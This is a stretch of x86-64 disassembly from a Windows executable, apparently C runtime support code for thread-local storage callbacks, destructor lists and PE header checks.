   140005cf0:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
   140005cf4:	0f 85 a7 fe ff ff    	jne    0x140005ba1
   140005cfa:	e9 51 ff ff ff       	jmp    0x140005c50
   140005cff:	90                   	nop
   140005d00:	31 c0                	xor    %eax,%eax
   140005d02:	48 83 c4 20          	add    $0x20,%rsp
   140005d06:	5b                   	pop    %rbx
   140005d07:	c3                   	ret
   140005d08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140005d0f:	00 
   140005d10:	ba 01 00 00 00       	mov    $0x1,%edx
   140005d15:	b9 08 00 00 00       	mov    $0x8,%ecx
   140005d1a:	e8 c1 5d 00 00       	call   0x14000bae0
   140005d1f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005d24:	e9 2c ff ff ff       	jmp    0x140005c55
   140005d29:	ba 01 00 00 00       	mov    $0x1,%edx
   140005d2e:	b9 04 00 00 00       	mov    $0x4,%ecx
   140005d33:	e8 a8 5d 00 00       	call   0x14000bae0
   140005d38:	83 c8 ff             	or     $0xffffffff,%eax
   140005d3b:	e9 15 ff ff ff       	jmp    0x140005c55
   140005d40:	ba 01 00 00 00       	mov    $0x1,%edx
   140005d45:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140005d4a:	e8 91 5d 00 00       	call   0x14000bae0
   140005d4f:	83 c8 ff             	or     $0xffffffff,%eax
   140005d52:	e9 fe fe ff ff       	jmp    0x140005c55
   140005d57:	90                   	nop
   140005d58:	90                   	nop
   140005d59:	90                   	nop
   140005d5a:	90                   	nop
   140005d5b:	90                   	nop
   140005d5c:	90                   	nop
   140005d5d:	90                   	nop
   140005d5e:	90                   	nop
   140005d5f:	90                   	nop
   140005d60:	55                   	push   %rbp
   140005d61:	57                   	push   %rdi
   140005d62:	56                   	push   %rsi
   140005d63:	53                   	push   %rbx
   140005d64:	48 83 ec 28          	sub    $0x28,%rsp
   140005d68:	48 8d 0d 91 63 38 00 	lea    0x386391(%rip),%rcx        # 0x14038c100
   140005d6f:	ff 15 df 74 38 00    	call   *0x3874df(%rip)        # 0x14038d254
   140005d75:	48 8b 1d 64 63 38 00 	mov    0x386364(%rip),%rbx        # 0x14038c0e0
   140005d7c:	48 85 db             	test   %rbx,%rbx
   140005d7f:	74 33                	je     0x140005db4
   140005d81:	48 8b 2d 3c 75 38 00 	mov    0x38753c(%rip),%rbp        # 0x14038d2c4
   140005d88:	48 8b 3d cd 74 38 00 	mov    0x3874cd(%rip),%rdi        # 0x14038d25c
   140005d8f:	90                   	nop
   140005d90:	8b 0b                	mov    (%rbx),%ecx
   140005d92:	ff d5                	call   *%rbp
   140005d94:	48 89 c6             	mov    %rax,%rsi
   140005d97:	ff d7                	call   *%rdi
   140005d99:	85 c0                	test   %eax,%eax
   140005d9b:	75 0e                	jne    0x140005dab
   140005d9d:	48 85 f6             	test   %rsi,%rsi
   140005da0:	74 09                	je     0x140005dab
   140005da2:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140005da6:	48 89 f1             	mov    %rsi,%rcx
   140005da9:	ff d0                	call   *%rax
   140005dab:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140005daf:	48 85 db             	test   %rbx,%rbx
   140005db2:	75 dc                	jne    0x140005d90
   140005db4:	48 8d 0d 45 63 38 00 	lea    0x386345(%rip),%rcx        # 0x14038c100
   140005dbb:	48 83 c4 28          	add    $0x28,%rsp
   140005dbf:	5b                   	pop    %rbx
   140005dc0:	5e                   	pop    %rsi
   140005dc1:	5f                   	pop    %rdi
   140005dc2:	5d                   	pop    %rbp
   140005dc3:	48 ff 25 ba 74 38 00 	rex.W jmp *0x3874ba(%rip)        # 0x14038d284
   140005dca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005dd0:	55                   	push   %rbp
   140005dd1:	57                   	push   %rdi
   140005dd2:	56                   	push   %rsi
   140005dd3:	53                   	push   %rbx
   140005dd4:	48 83 ec 28          	sub    $0x28,%rsp
   140005dd8:	8b 05 0a 63 38 00    	mov    0x38630a(%rip),%eax        # 0x14038c0e8
   140005dde:	31 f6                	xor    %esi,%esi
   140005de0:	85 c0                	test   %eax,%eax
   140005de2:	89 cd                	mov    %ecx,%ebp
   140005de4:	48 89 d7             	mov    %rdx,%rdi
   140005de7:	75 0b                	jne    0x140005df4
   140005de9:	89 f0                	mov    %esi,%eax
   140005deb:	48 83 c4 28          	add    $0x28,%rsp
   140005def:	5b                   	pop    %rbx
   140005df0:	5e                   	pop    %rsi
   140005df1:	5f                   	pop    %rdi
   140005df2:	5d                   	pop    %rbp
   140005df3:	c3                   	ret
   140005df4:	ba 18 00 00 00       	mov    $0x18,%edx
   140005df9:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005dfe:	e8 7d 5c 00 00       	call   0x14000ba80
   140005e03:	48 85 c0             	test   %rax,%rax
   140005e06:	48 89 c3             	mov    %rax,%rbx
   140005e09:	74 3d                	je     0x140005e48
   140005e0b:	89 28                	mov    %ebp,(%rax)
   140005e0d:	48 8d 0d ec 62 38 00 	lea    0x3862ec(%rip),%rcx        # 0x14038c100
   140005e14:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140005e18:	ff 15 36 74 38 00    	call   *0x387436(%rip)        # 0x14038d254
   140005e1e:	48 8b 05 bb 62 38 00 	mov    0x3862bb(%rip),%rax        # 0x14038c0e0
   140005e25:	48 8d 0d d4 62 38 00 	lea    0x3862d4(%rip),%rcx        # 0x14038c100
   140005e2c:	48 89 1d ad 62 38 00 	mov    %rbx,0x3862ad(%rip)        # 0x14038c0e0
   140005e33:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140005e37:	ff 15 47 74 38 00    	call   *0x387447(%rip)        # 0x14038d284
   140005e3d:	89 f0                	mov    %esi,%eax
   140005e3f:	48 83 c4 28          	add    $0x28,%rsp
   140005e43:	5b                   	pop    %rbx
   140005e44:	5e                   	pop    %rsi
   140005e45:	5f                   	pop    %rdi
   140005e46:	5d                   	pop    %rbp
   140005e47:	c3                   	ret
   140005e48:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140005e4d:	eb 9a                	jmp    0x140005de9
   140005e4f:	90                   	nop
   140005e50:	53                   	push   %rbx
   140005e51:	48 83 ec 20          	sub    $0x20,%rsp
   140005e55:	8b 05 8d 62 38 00    	mov    0x38628d(%rip),%eax        # 0x14038c0e8
   140005e5b:	85 c0                	test   %eax,%eax
   140005e5d:	89 cb                	mov    %ecx,%ebx
   140005e5f:	75 0f                	jne    0x140005e70
   140005e61:	31 c0                	xor    %eax,%eax
   140005e63:	48 83 c4 20          	add    $0x20,%rsp
   140005e67:	5b                   	pop    %rbx
   140005e68:	c3                   	ret
   140005e69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140005e70:	48 8d 0d 89 62 38 00 	lea    0x386289(%rip),%rcx        # 0x14038c100
   140005e77:	ff 15 d7 73 38 00    	call   *0x3873d7(%rip)        # 0x14038d254
   140005e7d:	48 8b 05 5c 62 38 00 	mov    0x38625c(%rip),%rax        # 0x14038c0e0
   140005e84:	48 85 c0             	test   %rax,%rax
   140005e87:	74 1a                	je     0x140005ea3
   140005e89:	8b 10                	mov    (%rax),%edx
   140005e8b:	39 d3                	cmp    %edx,%ebx
   140005e8d:	75 0b                	jne    0x140005e9a
   140005e8f:	eb 4b                	jmp    0x140005edc
   140005e91:	8b 11                	mov    (%rcx),%edx
   140005e93:	39 da                	cmp    %ebx,%edx
   140005e95:	74 29                	je     0x140005ec0
   140005e97:	48 89 c8             	mov    %rcx,%rax
   140005e9a:	48 8b 48 10          	mov    0x10(%rax),%rcx
   140005e9e:	48 85 c9             	test   %rcx,%rcx
   140005ea1:	75 ee                	jne    0x140005e91
   140005ea3:	48 8d 0d 56 62 38 00 	lea    0x386256(%rip),%rcx        # 0x14038c100
   140005eaa:	ff 15 d4 73 38 00    	call   *0x3873d4(%rip)        # 0x14038d284
   140005eb0:	31 c0                	xor    %eax,%eax
   140005eb2:	48 83 c4 20          	add    $0x20,%rsp
   140005eb6:	5b                   	pop    %rbx
   140005eb7:	c3                   	ret
   140005eb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140005ebf:	00 
   140005ec0:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140005ec4:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140005ec8:	e8 d3 5b 00 00       	call   0x14000baa0
   140005ecd:	48 8d 0d 2c 62 38 00 	lea    0x38622c(%rip),%rcx        # 0x14038c100
   140005ed4:	ff 15 aa 73 38 00    	call   *0x3873aa(%rip)        # 0x14038d284
   140005eda:	eb d4                	jmp    0x140005eb0
   140005edc:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140005ee0:	48 89 c1             	mov    %rax,%rcx
   140005ee3:	48 89 15 f6 61 38 00 	mov    %rdx,0x3861f6(%rip)        # 0x14038c0e0
   140005eea:	eb dc                	jmp    0x140005ec8
   140005eec:	0f 1f 40 00          	nopl   0x0(%rax)
   140005ef0:	53                   	push   %rbx
   140005ef1:	48 83 ec 20          	sub    $0x20,%rsp
   140005ef5:	83 fa 01             	cmp    $0x1,%edx
   140005ef8:	0f 84 97 00 00 00    	je     0x140005f95
   140005efe:	85 d2                	test   %edx,%edx
   140005f00:	74 33                	je     0x140005f35
   140005f02:	83 fa 02             	cmp    $0x2,%edx
   140005f05:	74 1e                	je     0x140005f25
   140005f07:	83 fa 03             	cmp    $0x3,%edx
   140005f0a:	75 0e                	jne    0x140005f1a
   140005f0c:	8b 05 d6 61 38 00    	mov    0x3861d6(%rip),%eax        # 0x14038c0e8
   140005f12:	85 c0                	test   %eax,%eax
   140005f14:	0f 85 a6 00 00 00    	jne    0x140005fc0
   140005f1a:	b8 01 00 00 00       	mov    $0x1,%eax
   140005f1f:	48 83 c4 20          	add    $0x20,%rsp
   140005f23:	5b                   	pop    %rbx
   140005f24:	c3                   	ret
   140005f25:	e8 06 f6 ff ff       	call   0x140005530
   140005f2a:	b8 01 00 00 00       	mov    $0x1,%eax
   140005f2f:	48 83 c4 20          	add    $0x20,%rsp
   140005f33:	5b                   	pop    %rbx
   140005f34:	c3                   	ret
   140005f35:	8b 05 ad 61 38 00    	mov    0x3861ad(%rip),%eax        # 0x14038c0e8
   140005f3b:	85 c0                	test   %eax,%eax
   140005f3d:	75 75                	jne    0x140005fb4
   140005f3f:	8b 05 a3 61 38 00    	mov    0x3861a3(%rip),%eax        # 0x14038c0e8
   140005f45:	83 f8 01             	cmp    $0x1,%eax
   140005f48:	75 d0                	jne    0x140005f1a
   140005f4a:	48 8b 0d 8f 61 38 00 	mov    0x38618f(%rip),%rcx        # 0x14038c0e0
   140005f51:	48 85 c9             	test   %rcx,%rcx
   140005f54:	74 1b                	je     0x140005f71
   140005f56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140005f5d:	00 00 00 
   140005f60:	48 8b 59 10          	mov    0x10(%rcx),%rbx
   140005f64:	e8 37 5b 00 00       	call   0x14000baa0
   140005f69:	48 85 db             	test   %rbx,%rbx
   140005f6c:	48 89 d9             	mov    %rbx,%rcx
   140005f6f:	75 ef                	jne    0x140005f60
   140005f71:	48 8d 0d 88 61 38 00 	lea    0x386188(%rip),%rcx        # 0x14038c100
   140005f78:	48 c7 05 5d 61 38 00 	movq   $0x0,0x38615d(%rip)        # 0x14038c0e0
   140005f7f:	00 00 00 00 
   140005f83:	c7 05 5b 61 38 00 00 	movl   $0x0,0x38615b(%rip)        # 0x14038c0e8
   140005f8a:	00 00 00 
   140005f8d:	ff 15 b9 72 38 00    	call   *0x3872b9(%rip)        # 0x14038d24c
   140005f93:	eb 85                	jmp    0x140005f1a
   140005f95:	8b 05 4d 61 38 00    	mov    0x38614d(%rip),%eax        # 0x14038c0e8
   140005f9b:	85 c0                	test   %eax,%eax
   140005f9d:	74 31                	je     0x140005fd0
   140005f9f:	c7 05 3f 61 38 00 01 	movl   $0x1,0x38613f(%rip)        # 0x14038c0e8
   140005fa6:	00 00 00 
   140005fa9:	b8 01 00 00 00       	mov    $0x1,%eax
   140005fae:	48 83 c4 20          	add    $0x20,%rsp
   140005fb2:	5b                   	pop    %rbx
   140005fb3:	c3                   	ret
   140005fb4:	e8 a7 fd ff ff       	call   0x140005d60
   140005fb9:	eb 84                	jmp    0x140005f3f
   140005fbb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005fc0:	e8 9b fd ff ff       	call   0x140005d60
   140005fc5:	e9 50 ff ff ff       	jmp    0x140005f1a
   140005fca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005fd0:	48 8d 0d 29 61 38 00 	lea    0x386129(%rip),%rcx        # 0x14038c100
   140005fd7:	ff 15 97 72 38 00    	call   *0x387297(%rip)        # 0x14038d274
   140005fdd:	eb c0                	jmp    0x140005f9f
   140005fdf:	90                   	nop
   140005fe0:	e9 9b 02 00 00       	jmp    0x140006280
   140005fe5:	90                   	nop
   140005fe6:	90                   	nop
   140005fe7:	90                   	nop
   140005fe8:	90                   	nop
   140005fe9:	90                   	nop
   140005fea:	90                   	nop
   140005feb:	90                   	nop
   140005fec:	90                   	nop
   140005fed:	90                   	nop
   140005fee:	90                   	nop
   140005fef:	90                   	nop
   140005ff0:	57                   	push   %rdi
   140005ff1:	56                   	push   %rsi
   140005ff2:	53                   	push   %rbx
   140005ff3:	48 83 ec 20          	sub    $0x20,%rsp
   140005ff7:	48 8b 19             	mov    (%rcx),%rbx
   140005ffa:	48 85 db             	test   %rbx,%rbx
   140005ffd:	48 89 cf             	mov    %rcx,%rdi
   140006000:	74 1a                	je     0x14000601c
   140006002:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140006006:	ff 13                	call   *(%rbx)
   140006008:	48 8b 73 10          	mov    0x10(%rbx),%rsi
   14000600c:	48 89 d9             	mov    %rbx,%rcx
   14000600f:	e8 8c 5a 00 00       	call   0x14000baa0
   140006014:	48 85 f6             	test   %rsi,%rsi
   140006017:	48 89 f3             	mov    %rsi,%rbx
   14000601a:	75 e6                	jne    0x140006002
   14000601c:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   140006023:	48 83 c4 20          	add    $0x20,%rsp
   140006027:	5b                   	pop    %rbx
   140006028:	5e                   	pop    %rsi
   140006029:	5f                   	pop    %rdi
   14000602a:	c3                   	ret
   14000602b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006030:	53                   	push   %rbx
   140006031:	48 83 ec 30          	sub    $0x30,%rsp
   140006035:	83 fa 01             	cmp    $0x1,%edx
   140006038:	48 89 cb             	mov    %rcx,%rbx
   14000603b:	74 43                	je     0x140006080
   14000603d:	85 d2                	test   %edx,%edx
   14000603f:	74 5f                	je     0x1400060a0
   140006041:	83 fa 03             	cmp    $0x3,%edx
   140006044:	75 2d                	jne    0x140006073
   140006046:	8b 0d 34 24 38 00    	mov    0x382434(%rip),%ecx        # 0x140388480
   14000604c:	ff 15 72 72 38 00    	call   *0x387272(%rip)        # 0x14038d2c4
   140006052:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140006057:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000605c:	e8 8f ff ff ff       	call   0x140005ff0
   140006061:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140006066:	8b 0d 14 24 38 00    	mov    0x382414(%rip),%ecx        # 0x140388480
   14000606c:	ff 15 5a 72 38 00    	call   *0x38725a(%rip)        # 0x14038d2cc
   140006072:	90                   	nop
   140006073:	48 83 c4 30          	add    $0x30,%rsp
   140006077:	5b                   	pop    %rbx
   140006078:	c3                   	ret
   140006079:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140006080:	8b 05 c2 60 38 00    	mov    0x3860c2(%rip),%eax        # 0x14038c148
   140006086:	85 c0                	test   %eax,%eax
   140006088:	0f 84 92 00 00 00    	je     0x140006120
   14000608e:	c7 05 b0 60 38 00 01 	movl   $0x1,0x3860b0(%rip)        # 0x14038c148
   140006095:	00 00 00 
   140006098:	48 83 c4 30          	add    $0x30,%rsp
   14000609c:	5b                   	pop    %rbx
   14000609d:	c3                   	ret
   14000609e:	66 90                	xchg   %ax,%ax
   1400060a0:	48 8b 05 69 3b 38 00 	mov    0x383b69(%rip),%rax        # 0x140389c10
   1400060a7:	80 38 00             	cmpb   $0x0,(%rax)
   1400060aa:	75 24                	jne    0x1400060d0
   1400060ac:	83 3d 95 60 38 00 01 	cmpl   $0x1,0x386095(%rip)        # 0x14038c148
   1400060b3:	75 be                	jne    0x140006073
   1400060b5:	48 8d 0d a4 60 38 00 	lea    0x3860a4(%rip),%rcx        # 0x14038c160
   1400060bc:	c7 05 82 60 38 00 00 	movl   $0x0,0x386082(%rip)        # 0x14038c148
   1400060c3:	00 00 00 
   1400060c6:	ff 15 80 71 38 00    	call   *0x387180(%rip)        # 0x14038d24c
   1400060cc:	eb a5                	jmp    0x140006073
   1400060ce:	66 90                	xchg   %ax,%ax
   1400060d0:	8b 0d aa 23 38 00    	mov    0x3823aa(%rip),%ecx        # 0x140388480
   1400060d6:	ff 15 e8 71 38 00    	call   *0x3871e8(%rip)        # 0x14038d2c4
   1400060dc:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400060e1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400060e6:	e8 05 ff ff ff       	call   0x140005ff0
   1400060eb:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   1400060f0:	8b 0d 8a 23 38 00    	mov    0x38238a(%rip),%ecx        # 0x140388480
   1400060f6:	ff 15 d0 71 38 00    	call   *0x3871d0(%rip)        # 0x14038d2cc
   1400060fc:	48 8d 0d 3d 60 38 00 	lea    0x38603d(%rip),%rcx        # 0x14038c140
   140006103:	e8 e8 fe ff ff       	call   0x140005ff0
   140006108:	8b 0d 72 23 38 00    	mov    0x382372(%rip),%ecx        # 0x140388480
   14000610e:	ff 15 a8 71 38 00    	call   *0x3871a8(%rip)        # 0x14038d2bc
   140006114:	eb 96                	jmp    0x1400060ac
   140006116:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000611d:	00 00 00 
   140006120:	48 8d 0d 39 60 38 00 	lea    0x386039(%rip),%rcx        # 0x14038c160
   140006127:	ff 15 47 71 38 00    	call   *0x387147(%rip)        # 0x14038d274
   14000612d:	48 89 1d fc 6a 38 00 	mov    %rbx,0x386afc(%rip)        # 0x14038cc30
   140006134:	ff 15 7a 71 38 00    	call   *0x38717a(%rip)        # 0x14038d2b4
   14000613a:	89 05 40 23 38 00    	mov    %eax,0x382340(%rip)        # 0x140388480
   140006140:	48 8b 05 c9 3a 38 00 	mov    0x383ac9(%rip),%rax        # 0x140389c10
   140006147:	80 38 00             	cmpb   $0x0,(%rax)
   14000614a:	0f 85 3e ff ff ff    	jne    0x14000608e
   140006150:	48 8d 0d 19 00 00 00 	lea    0x19(%rip),%rcx        # 0x140006170
   140006157:	e8 34 55 00 00       	call   0x14000b690
   14000615c:	e9 2d ff ff ff       	jmp    0x14000608e
   140006161:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006166:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000616d:	00 00 00 
   140006170:	48 83 ec 38          	sub    $0x38,%rsp
   140006174:	85 d2                	test   %edx,%edx
   140006176:	74 08                	je     0x140006180
   140006178:	48 83 c4 38          	add    $0x38,%rsp
   14000617c:	c3                   	ret
   14000617d:	0f 1f 00             	nopl   (%rax)
   140006180:	8b 0d fa 22 38 00    	mov    0x3822fa(%rip),%ecx        # 0x140388480
   140006186:	ff 15 38 71 38 00    	call   *0x387138(%rip)        # 0x14038d2c4
   14000618c:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140006191:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006196:	e8 55 fe ff ff       	call   0x140005ff0
   14000619b:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   1400061a0:	8b 0d da 22 38 00    	mov    0x3822da(%rip),%ecx        # 0x140388480
   1400061a6:	ff 15 20 71 38 00    	call   *0x387120(%rip)        # 0x14038d2cc
   1400061ac:	8b 0d ce 22 38 00    	mov    0x3822ce(%rip),%ecx        # 0x140388480
   1400061b2:	ff 15 04 71 38 00    	call   *0x387104(%rip)        # 0x14038d2bc
   1400061b8:	48 8d 0d 81 5f 38 00 	lea    0x385f81(%rip),%rcx        # 0x14038c140
   1400061bf:	e8 2c fe ff ff       	call   0x140005ff0
   1400061c4:	90                   	nop
   1400061c5:	48 83 c4 38          	add    $0x38,%rsp
   1400061c9:	c3                   	ret
   1400061ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400061d0:	57                   	push   %rdi
   1400061d1:	56                   	push   %rsi
   1400061d2:	53                   	push   %rbx
   1400061d3:	48 83 ec 20          	sub    $0x20,%rsp
   1400061d7:	8b 05 6b 5f 38 00    	mov    0x385f6b(%rip),%eax        # 0x14038c148
   1400061dd:	85 c0                	test   %eax,%eax
   1400061df:	48 89 cf             	mov    %rcx,%rdi
   1400061e2:	48 89 d6             	mov    %rdx,%rsi
   1400061e5:	74 7e                	je     0x140006265
   1400061e7:	4d 85 c0             	test   %r8,%r8
   1400061ea:	74 25                	je     0x140006211
   1400061ec:	48 8d 05 3d 6a 38 00 	lea    0x386a3d(%rip),%rax        # 0x14038cc30
   1400061f3:	49 39 c0             	cmp    %rax,%r8
   1400061f6:	74 19                	je     0x140006211
   1400061f8:	48 8d 15 e1 34 38 00 	lea    0x3834e1(%rip),%rdx        # 0x1403896e0
   1400061ff:	41 b8 2b 00 00 00    	mov    $0x2b,%r8d
   140006205:	48 8d 0d 07 35 38 00 	lea    0x383507(%rip),%rcx        # 0x140389713
   14000620c:	e8 2f 58 00 00       	call   0x14000ba40
   140006211:	ba 18 00 00 00       	mov    $0x18,%edx
   140006216:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000621b:	e8 60 58 00 00       	call   0x14000ba80
   140006220:	48 85 c0             	test   %rax,%rax
   140006223:	48 89 c3             	mov    %rax,%rbx
   140006226:	74 3d                	je     0x140006265
   140006228:	48 89 38             	mov    %rdi,(%rax)
   14000622b:	48 8d 0d 2e 5f 38 00 	lea    0x385f2e(%rip),%rcx        # 0x14038c160
   140006232:	48 89 70 08          	mov    %rsi,0x8(%rax)
   140006236:	ff 15 18 70 38 00    	call   *0x387018(%rip)        # 0x14038d254
   14000623c:	48 8b 05 fd 5e 38 00 	mov    0x385efd(%rip),%rax        # 0x14038c140
   140006243:	48 8d 0d 16 5f 38 00 	lea    0x385f16(%rip),%rcx        # 0x14038c160
   14000624a:	48 89 1d ef 5e 38 00 	mov    %rbx,0x385eef(%rip)        # 0x14038c140
   140006251:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006255:	ff 15 29 70 38 00    	call   *0x387029(%rip)        # 0x14038d284
   14000625b:	31 c0                	xor    %eax,%eax
   14000625d:	48 83 c4 20          	add    $0x20,%rsp
   140006261:	5b                   	pop    %rbx
   140006262:	5e                   	pop    %rsi
   140006263:	5f                   	pop    %rdi
   140006264:	c3                   	ret
   140006265:	b8 01 00 00 00       	mov    $0x1,%eax
   14000626a:	48 83 c4 20          	add    $0x20,%rsp
   14000626e:	5b                   	pop    %rbx
   14000626f:	5e                   	pop    %rsi
   140006270:	5f                   	pop    %rdi
   140006271:	c3                   	ret
   140006272:	0f 1f 40 00          	nopl   0x0(%rax)
   140006276:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000627d:	00 00 00 
   140006280:	57                   	push   %rdi
   140006281:	56                   	push   %rsi
   140006282:	53                   	push   %rbx
   140006283:	48 83 ec 20          	sub    $0x20,%rsp
   140006287:	8b 05 bb 5e 38 00    	mov    0x385ebb(%rip),%eax        # 0x14038c148
   14000628d:	85 c0                	test   %eax,%eax
   14000628f:	48 89 cf             	mov    %rcx,%rdi
   140006292:	48 89 d6             	mov    %rdx,%rsi
   140006295:	74 79                	je     0x140006310
   140006297:	4d 85 c0             	test   %r8,%r8
   14000629a:	74 25                	je     0x1400062c1
   14000629c:	48 8d 05 8d 69 38 00 	lea    0x38698d(%rip),%rax        # 0x14038cc30
   1400062a3:	49 39 c0             	cmp    %rax,%r8
   1400062a6:	74 19                	je     0x1400062c1
   1400062a8:	48 8d 15 31 34 38 00 	lea    0x383431(%rip),%rdx        # 0x1403896e0
   1400062af:	41 b8 46 00 00 00    	mov    $0x46,%r8d
   1400062b5:	48 8d 0d 57 34 38 00 	lea    0x383457(%rip),%rcx        # 0x140389713
   1400062bc:	e8 7f 57 00 00       	call   0x14000ba40
   1400062c1:	ba 18 00 00 00       	mov    $0x18,%edx
   1400062c6:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400062cb:	e8 b0 57 00 00       	call   0x14000ba80
   1400062d0:	48 85 c0             	test   %rax,%rax
   1400062d3:	48 89 c3             	mov    %rax,%rbx
   1400062d6:	74 38                	je     0x140006310
   1400062d8:	48 89 38             	mov    %rdi,(%rax)
   1400062db:	8b 0d 9f 21 38 00    	mov    0x38219f(%rip),%ecx        # 0x140388480
   1400062e1:	48 89 70 08          	mov    %rsi,0x8(%rax)
   1400062e5:	ff 15 d9 6f 38 00    	call   *0x386fd9(%rip)        # 0x14038d2c4
   1400062eb:	8b 0d 8f 21 38 00    	mov    0x38218f(%rip),%ecx        # 0x140388480
   1400062f1:	48 89 da             	mov    %rbx,%rdx
   1400062f4:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400062f8:	ff 15 ce 6f 38 00    	call   *0x386fce(%rip)        # 0x14038d2cc
   1400062fe:	31 c0                	xor    %eax,%eax
   140006300:	48 83 c4 20          	add    $0x20,%rsp
   140006304:	5b                   	pop    %rbx
   140006305:	5e                   	pop    %rsi
   140006306:	5f                   	pop    %rdi
   140006307:	c3                   	ret
   140006308:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000630f:	00 
   140006310:	b8 01 00 00 00       	mov    $0x1,%eax
   140006315:	48 83 c4 20          	add    $0x20,%rsp
   140006319:	5b                   	pop    %rbx
   14000631a:	5e                   	pop    %rsi
   14000631b:	5f                   	pop    %rdi
   14000631c:	c3                   	ret
   14000631d:	90                   	nop
   14000631e:	90                   	nop
   14000631f:	90                   	nop
   140006320:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140006324:	48 01 c1             	add    %rax,%rcx
   140006327:	31 c0                	xor    %eax,%eax
   140006329:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000632f:	75 0b                	jne    0x14000633c
   140006331:	31 c0                	xor    %eax,%eax
   140006333:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   140006339:	0f 94 c0             	sete   %al
   14000633c:	c3                   	ret
   14000633d:	0f 1f 00             	nopl   (%rax)
   140006340:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140006345:	75 09                	jne    0x140006350
   140006347:	eb d7                	jmp    0x140006320
   140006349:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140006350:	31 c0                	xor    %eax,%eax
   140006352:	c3                   	ret
   140006353:	0f 1f 00             	nopl   (%rax)
   140006356:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000635d:	00 00 00 
   140006360:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140006364:	48 01 c1             	add    %rax,%rcx
   140006367:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   14000636b:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   140006370:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
   140006374:	85 c9                	test   %ecx,%ecx
   140006376:	74 29                	je     0x1400063a1
   140006378:	83 e9 01             	sub    $0x1,%ecx
   14000637b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   14000637f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
   140006384:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140006388:	49 39 d0             	cmp    %rdx,%r8
   14000638b:	4c 89 c1             	mov    %r8,%rcx
   14000638e:	77 08                	ja     0x140006398
   140006390:	03 48 08             	add    0x8(%rax),%ecx
   140006393:	48 39 d1             	cmp    %rdx,%rcx
   140006396:	77 0b                	ja     0x1400063a3
   140006398:	48 83 c0 28          	add    $0x28,%rax
   14000639c:	4c 39 c8             	cmp    %r9,%rax
   14000639f:	75 e3                	jne    0x140006384
   1400063a1:	31 c0                	xor    %eax,%eax
   1400063a3:	c3                   	ret
   1400063a4:	66 90                	xchg   %ax,%ax
   1400063a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400063ad:	00 00 00 
   1400063b0:	57                   	push   %rdi
   1400063b1:	56                   	push   %rsi
   1400063b2:	53                   	push   %rbx
   1400063b3:	48 83 ec 20          	sub    $0x20,%rsp
   1400063b7:	48 89 ce             	mov    %rcx,%rsi
   1400063ba:	e8 31 57 00 00       	call   0x14000baf0
   1400063bf:	48 83 f8 08          	cmp    $0x8,%rax
   1400063c3:	77 7b                	ja     0x140006440
   1400063c5:	48 8b 15 b4 37 38 00 	mov    0x3837b4(%rip),%rdx        # 0x140389b80
   1400063cc:	31 db                	xor    %ebx,%ebx
   1400063ce:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   1400063d3:	75 59                	jne    0x14000642e
   1400063d5:	48 89 d1             	mov    %rdx,%rcx
   1400063d8:	e8 43 ff ff ff       	call   0x140006320
   1400063dd:	85 c0                	test   %eax,%eax
   1400063df:	74 4d                	je     0x14000642e
